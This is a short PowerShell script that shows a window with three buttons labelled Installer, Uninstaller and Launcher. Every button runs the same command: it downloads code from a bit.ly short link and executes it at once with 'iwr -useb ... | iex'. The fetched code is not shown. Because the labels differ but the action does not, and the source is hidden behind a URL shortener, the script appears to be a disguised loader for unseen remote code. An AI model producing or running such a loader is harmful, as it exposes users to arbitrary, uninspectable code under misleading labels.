Add-Type -AssemblyName PresentationFramework

$window = New-Object System.Windows.Window
$window.Title = "Run"
$window.Width = 200
$window.Height = 188

$button1 = New-Object System.Windows.Controls.Button
$button1.Content = "Installer"
$button1.Height = 50
$button1.Margin = New-Object System.Windows.Thickness 0
$button1.Add_Click({
    iwr -useb bit.ly/40sK7Fy | iex
})

$button2 = New-Object System.Windows.Controls.Button
$button2.Content = "Uninstaller"
$button2.Height = 50
$button2.Margin = New-Object System.Windows.Thickness 0
$button2.Add_Click({
    iwr -useb bit.ly/40sK7Fy | iex
})

$button3 = New-Object System.Windows.Controls.Button
$button3.Content = "Launcher"
$button3.Height = 50
$button3.Margin = New-Object System.Windows.Thickness 0
$button3.Add_Click({
    iwr -useb bit.ly/40sK7Fy | iex
})

$stackPanel = New-Object System.Windows.Controls.StackPanel
$stackPanel.VerticalAlignment = [System.Windows.VerticalAlignment]::Center
$stackPanel.Children.Add($button1)
$stackPanel.Children.Add($button2)
$stackPanel.Children.Add($button3)

$window.Content = $stackPanel

$window.ShowDialog() | Out-Null
